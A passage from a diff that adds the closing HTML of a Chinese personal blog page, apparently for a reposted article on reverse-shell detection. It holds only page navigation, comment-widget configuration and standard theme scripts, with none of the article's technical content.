+  <a href="/categories/%E5%AE%89%E5%85%A8/" class="category-chain-item">安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E8%BD%AC%E8%BD%BD/">#转载</a>
+      
+        <a href="/tags/linux/">#linux</a>
+      
+        <a href="/tags/%E5%AE%89%E5%85%A8/">#安全</a>
+      
+        <a href="/tags/%E5%AE%B9%E5%99%A8/">#容器</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>入侵检测——反弹Shell原理以及常见检测技术</div>
+      <div>https://blog.longpi1.com/2023/02/04/入侵检测——反弹Shell原理以及常见检测技术/</div>
+    </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/02/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E4%BA%86%E8%A7%A3Kubernetes%E6%94%BB%E9%98%B2/" title="从零开始了解Kubernetes攻防">
+                        <span class="hidden-mobile">从零开始了解Kubernetes攻防</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </article></div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"UvaCwj6C0pVj9XCWuMtLaBWJ-gzGzoHsz","appKey":"w2xUk9wycItSqrREmRMDYJHY","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <div>lp的个人博客 | 记录成长的过程</div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js"></script>
+  <link rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css">
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js"></script>
+<script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script>
+<script src="/js/events.js"></script>
+<script src="/js/plugins.js"></script>
+
+
+  <script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script src="/js/img-lazyload.js"></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src="https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js"></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js"></script>
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script src="/js/boot.js"></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
